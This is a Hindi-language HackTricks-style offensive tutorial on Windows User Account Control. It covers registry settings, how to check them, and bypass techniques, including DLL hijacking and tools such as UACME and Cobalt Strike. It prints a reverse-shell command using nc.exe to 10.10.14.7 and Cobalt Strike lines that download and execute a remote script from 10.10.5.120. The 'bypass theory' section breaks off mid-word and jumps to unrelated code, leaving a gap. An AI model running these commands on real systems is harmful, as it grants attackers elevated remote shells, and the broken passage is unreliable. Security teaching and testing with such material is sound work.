# UAC - यूजर अकाउंट कंट्रोल

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करके दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **वर्कफ्लो को आसानी से बनाएं और स्वचालित करें**.\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[UAC (यूजर अकाउंट कंट्रोल)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक सुविधा है जो **उच्च स्तरीय गतिविधियों के लिए सहमति प्रॉम्प्ट को सक्षम करती है**. एप्लिकेशन्स के विभिन्न `integrity` स्तर होते हैं, और एक **उच्च स्तर** वाला प्रोग्राम ऐसे कार्य कर सकता है जो **सिस्टम को संभावित रूप से समझौता कर सकते हैं**. जब UAC सक्षम होता है, एप्लिकेशन्स और कार्य हमेशा **एक गैर-प्रशासक खाते के सुरक्षा संदर्भ के तहत चलते हैं** जब तक कि एक प्रशासक स्पष्ट रूप से इन एप्लिकेशन्स/कार्यों को सिस्टम पर चलाने के लिए प्रशासक-स्तरीय पहुंच प्रदान नहीं करता. यह एक सुविधा है जो प्रशासकों को अनजाने में परिवर्तनों से बचाती है लेकिन इसे सुरक्षा सीमा के रूप में नहीं माना जाता है.

अखंडता स्तरों के बारे में अधिक जानकारी के लिए:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

जब UAC लागू होता है, एक प्रशासक उपयोगकर्ता को 2 टोकन दिए जाते हैं: एक सामान्य उपयोगकर्ता कुंजी, नियमित स्तर पर नियमित कार्यों के लिए, और एक प्रशासक विशेषाधिकारों के साथ.

इस [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) पर UAC कैसे काम करता है इसकी गहराई से चर्चा की गई है और इसमें लॉगऑन प्रक्रिया, उपयोगकर्ता अनुभव, और UAC आर्किटेक्चर शामिल हैं. प्रशासक सुरक्षा नीतियों का उपयोग करके स्थानीय स्तर पर (secpol.msc का उपयोग करके) या एक एक्टिव डायरेक्टरी डोमेन वातावरण में ग्रुप पॉलिसी ऑब्जेक्ट्स (GPO) के माध्यम से कॉन्फ़िगर और पुश किए जाने वाले UAC को अपने संगठन के लिए विशिष्ट रूप से कॉन्फ़िगर कर सकते हैं. विभिन्न सेटिंग्स की विस्तार से चर्चा [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) की गई है. UAC के लिए 10 ग्रुप पॉलिसी सेटिंग्स सेट की जा सकती हैं. निम्नलिखित तालिका अतिरिक्त विवरण प्रदान करती है:

| ग्रुप पॉलिसी सेटिंग                                                                                                                                                                                                                                                                                                                                                           | रजिस्ट्री कुंजी                | डिफ़ॉल्ट सेटिंग                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [यूजर अकाउंट कंट्रोल: बिल्ट-इन एडमिनिस्ट्रेटर अकाउंट के लिए एडमिन अप्रूवल मोड](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [यूजर अकाउंट कंट्रोल: UIAccess एप्लिकेशन्स को सिक्योर डेस्कटॉप का उपयोग किए बिना एलिवेशन के लिए प्रॉम्प्ट करने की अनुमति दें](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [यूजर अकाउंट कंट्रोल: एडमिन अप्रूवल मोड में प्रशासकों के लिए एलिवेशन प्रॉम्प्ट का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | गैर-विंडोज बाइनरीज के लिए सहमति के लिए प्रॉम्प्ट                  |
| [यूजर अकाउंट कंट्रोल: सामान्य उपयोगकर्ताओं के लिए एलिवेशन प्रॉम्प्ट का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | सिक्योर डेस्कटॉप पर क्रेडेंशियल्स के लिए प्रॉम्प्ट                 |
| [यूजर अकाउंट कंट्रोल: एप्लिकेशन इंस्टालेशन्स का पता लगाएं और एलिवेशन के लिए प्रॉम्प्ट करें](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | सक्षम (घर के लिए डिफ़ॉल्ट) अक्षम (उद्यम के लिए डिफ़ॉल्ट) |
| [यूजर अकाउंट कंट्रोल: केवल उन एक्जीक्यूटेबल्स को एलिवेट करें जो साइन किए गए हैं और मान्य किए गए हैं](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [यूजर अकाउंट कंट्रोल: केवल UIAccess एप्लिकेशन्स को एलिवेट करें जो सिक्योर लोकेशन्स में इंस्टॉल किए गए हैं](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | सक्षम                                                      |
| [यूजर अकाउंट कंट्रोल: सभी प्रशासकों को एडमिन अप्रूवल मोड में चलाएं](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | सक्षम                                                      |
| [यूजर अकाउंट कंट्रोल: एलिवेशन के लिए प्रॉम्प्ट करते समय सिक्योर डेस्कटॉप पर स्विच करें](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | सक्षम                                                      |
| [यूजर अकाउंट कंट्रोल: फाइल और रजिस्ट्री लिखने की विफलताओं को प्रति-उपयोगकर्ता स्थानों पर वर्चुअलाइज़ करें](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | सक्षम                                                      |

### UAC बायपास सिद्धांत

कुछ प्रोग्राम्स **स्वचालित रूप से ऑटोएलिवेटेड** होते हैं यदि **उपयोगकर्ता प
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह **मौजूद नहीं है**, तो UAC **निष्क्रिय** है।

फिर, जांचें कि **कौन सा स्तर** कॉन्फ़िगर किया गया है:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* यदि **`0`** तो, UAC प्रॉम्प्ट नहीं करेगा (जैसे कि **निष्क्रिय**)
* यदि **`1`** तो एडमिन से **उपयोगकर्ता नाम और पासवर्ड मांगा जाएगा** उच्च अधिकारों के साथ बाइनरी को निष्पादित करने के लिए (सुरक्षित डेस्कटॉप पर)
* यदि **`2`** (**हमेशा सूचित करें**) UAC हमेशा प्रशासक से पुष्टि मांगेगा जब वह उच्च विशेषाधिकारों के साथ कुछ निष्पादित करने की कोशिश करता है (सुरक्षित डेस्कटॉप पर)
* यदि **`3`** `1` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
* यदि **`4`** `2` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
* यदि **`5`**(**डिफ़ॉल्ट**) यह एडमिनिस्ट्रेटर से उच्च विशेषाधिकारों के साथ गैर Windows बाइनरीज़ को चलाने की पुष्टि मांगेगा

फिर, आपको **`LocalAccountTokenFilterPolicy`** के मान पर ध्यान देना होगा\
यदि मान **`0`** है, तो, केवल **RID 500** उपयोगकर्ता (**निर्मित प्रशासक**) ही **बिना UAC के एडमिन कार्य कर सकता है**, और यदि यह `1` है, तो **"प्रशासकों" समूह के अंदर सभी खाते** उन्हें कर सकते हैं।

और, अंत में **`FilterAdministratorToken`** कुंजी के मान पर नज़र डालें\
यदि **`0`**(डिफ़ॉल्ट), तो **निर्मित प्रशासक खाता** दूरस्थ प्रशासन कार्य कर सकता है और यदि **`1`** तो निर्मित खाता प्रशासक **नहीं** कर सकता है दूरस्थ प्रशासन कार्य, जब तक कि `LocalAccountTokenFilterPolicy` को `1` पर सेट नहीं किया गया हो।

#### सारांश

* यदि `EnableLUA=0` या **मौजूद नहीं है**, तो **किसी के लिए भी UAC नहीं**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=1`, किसी के लिए भी UAC नहीं**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=0`, RID 500 (निर्मित प्रशासक) के लिए UAC नहीं**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=1`, सभी के लिए UAC**

इस सभी जानकारी को **metasploit** मॉड्यूल का उपयोग करके एकत्र किया जा सकता है: `post/windows/gather/win_privs`

आप अपने उपयोगकर्ता के समूहों की भी जांच कर सकते हैं और अखंडता स्तर प्राप्त कर सकते हैं:
```
net user %username%
whoami /groups | findstr Level
```
## UAC बायपास

{% hint style="info" %}
ध्यान दें कि यदि आपके पास पीड़ित का ग्राफिकल एक्सेस है, तो UAC बायपास सीधा है क्योंकि आप UAS प्रॉम्प्ट दिखाई देने पर सिर्फ "हां" पर क्लिक कर सकते हैं
{% endhint %}

UAC बायपास निम्नलिखित स्थिति में आवश्यक है: **UAC सक्रिय है, आपकी प्रक्रिया मध्यम अखंडता संदर्भ में चल रही है, और आपका उपयोगकर्ता प्रशासक समूह का सदस्य है**।

यह उल्लेख करना महत्वपूर्ण है कि यदि UAC सबसे उच्च सुरक्षा स्तर (हमेशा) में है, तो इसे बायपास करना बहुत कठिन है बजाय इसके कि यह किसी अन्य स्तर (डिफ़ॉल्ट) में हो।

### UAC अक्षम

यदि UAC पहले से ही अक्षम है (`ConsentPromptBehaviorAdmin` **`0`** है) तो आप **एडमिन विशेषाधिकारों के साथ एक रिवर्स शेल को निष्पादित कर सकते हैं** (उच्च अखंडता स्तर) जैसे कुछ का उपयोग करके:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC के साथ टोकन डुप्लिकेशन

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** बुनियादी UAC "bypass" (पूरी फाइल सिस्टम एक्सेस)

यदि आपके पास एक शेल है जो एडमिनिस्ट्रेटर्स समूह के अंदर के उपयोगकर्ता के साथ है, तो आप **C$ को माउंट कर सकते हैं** जो SMB (फाइल सिस्टम) के माध्यम से साझा किया गया है, स्थानीय रूप में एक नई डिस्क में और आपके पास **फाइल सिस्टम के अंदर सब कुछ तक पहुँच होगी** (यहाँ तक कि एडमिनिस्ट्रेटर होम फोल्डर भी).

{% hint style="warning" %}
**लगता है यह चाल अब काम नहीं कर रही है**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### कोबाल्ट स्ट्राइक के साथ UAC बाईपास

कोबाल्ट स्ट्राइक तकनीकें केवल तभी काम करेंगी जब UAC अपने अधिकतम सुरक्षा स्तर पर सेट नहीं होता है
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई मॉड्यूल हैं।

### KRBUACBypass

दस्तावेज़ और टूल [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) पर उपलब्ध हैं।

### UAC bypass एक्सप्लॉइट्स

[**UACME**](https://github.com/hfiref0x/UACME) जो कई UAC bypass एक्सप्लॉइट्स का **संकलन** है। ध्यान दें कि आपको **UACME को visual studio या msbuild का उपयोग करके कंपाइल** करना होगा। कंपाइलेशन से कई एक्जीक्यूटेबल्स बनेंगे (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`), आपको पता होना चाहिए **कि आपको कौन सा चाहिए।**\
आपको **सावधान रहना चाहिए** क्योंकि कुछ bypasses **कुछ अन्य प्रोग्राम्स को प्रॉम्प्ट करेंगे** जो **यूजर** को अलर्ट करेंगे कि कुछ हो रहा है।

UACME में **वह बिल्ड वर्जन है जिससे प्रत्येक तकनीक काम करना शुरू हुई**। आप अपने वर्जन्स को प्रभावित करने वाली तकनीक की खोज कर सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
#### और UAC बायपास

**सभी** तकनीकें जो यहाँ AUC बायपास करने के लिए इस्तेमाल की गई हैं, उन्हें **पूर्ण इंटरैक्टिव शेल** की **आवश्यकता** होती है जो पीड़ित के साथ हो (एक सामान्य nc.exe शेल पर्याप्त नहीं है)।

आप **मीटरप्रीटर** सत्र का उपयोग कर सकते हैं। एक **प्रक्रिया** में माइग्रेट करें जिसका **सेशन** मान **1** के बराबर हो:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ काम करना चाहिए)

### UAC बायपास GUI के साथ

अगर आपके पास **GUI** तक पहुँच है तो आप जब UAC प्रॉम्प्ट प्राप्त करते हैं तो बस उसे स्वीकार कर सकते हैं, आपको वास्तव में इसे बायपास करने की जरूरत नहीं है। इसलिए, GUI तक पहुँच प्राप्त करने से आप UAC को बायपास कर सकते हैं।

इसके अलावा, अगर आपको किसी GUI सत्र तक पहुँच मिलती है जिसे कोई उपयोग कर रहा था (संभवतः RDP के माध्यम से) तो कुछ टूल्स होंगे जो पहले से ही एडमिनिस्ट्रेटर के रूप में चल रहे होंगे जहाँ से आप सीधे **cmd** को **एडमिन** के रूप में **चला** सकते हैं बिना UAC द्वारा फिर से प्रॉम्प्ट किए जाने के जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **चुपके** हो सकता है।

### शोरगुल वाला ब्रूट-फोर्स UAC बायपास

अगर आपको शोरगुल की परवाह नहीं है तो आप हमेशा [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा कुछ **चला** सकते हैं जो **उपयोगकर्ता से अनुमति बढ़ाने के लिए कहता है जब तक कि उपयोगकर्ता इसे स्वीकार नहीं करता**।

### आपका खुद का बायपास - बेसिक UAC बायपास पद्धति

अगर आप **UACME** को देखेंगे तो आप नोट करेंगे कि **अधिकांश UAC बायपास Dll Hijacking भेद्यता का दुरुपयोग करते हैं** (मुख्य रूप से _C:\Windows\System32_ पर दुर्भावनापूर्ण dll लिखकर)। [Dll Hijacking भेद्यता को कैसे खोजें इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking.md)।

1. एक बाइनरी खोजें जो **ऑटोएलिवेट** करेगी (जांचें कि जब यह निष्पादित होती है तो यह उच्च अखंडता स्तर पर चलती है)।
2. प्रोकमॉन के साथ "**NAME NOT FOUND**" इवेंट्स खोजें जो **DLL Hijacking** के लिए भेद्य हो सकते हैं।
3. आपको शायद DLL को कुछ **सुरक्षित पथों** में **लिखने** की आवश्यकता होगी (जैसे C:\Windows\System32) जहाँ आपके पास लिखने की अनुमति नहीं है। इसे बायपास करने के लिए आप उपयोग कर सकते हैं:
   1. **wusa.exe**: Windows 7,8 और 8.1। यह सुरक्षित पथों के अंदर CAB फाइल की सामग्री को निकालने की अनुमति देता है (क्योंकि यह टूल उच्च अखंडता स्तर से निष्पादित होता है)।
   2. **IFileOperation**: Windows 10।
4. सुरक्षित पथ के अंदर अपने DLL को कॉपी करने और भेद्य और ऑटोएलिवेटेड बाइनरी को निष्पादित करने के लिए एक **स्क्रिप्ट** तैयार करें।

### एक और UAC बायपास तकनीक

इसमें देखना शामिल है कि क्या एक **ऑटोएलिवेटेड बाइनरी** **रजिस्ट्री** से एक **बाइनरी** या **कमांड** के **नाम/पथ** को **पढ़ने** की कोशिश करती है जिसे **निष्पादित** किया जाना है (यह अधिक रोचक है अगर बाइनरी इस जानकारी को **HKCU** के अंदर खोजती है)।

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करके आसानी से दुनिया के **सबसे उन्नत** समुदाय टूल्स द्वारा संचालित **वर्कफ्लोज़ को बिल्ड और ऑटोमेट** करें।\
आज ही पहुँच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong>!</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें**।
* **HackTricks** के [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
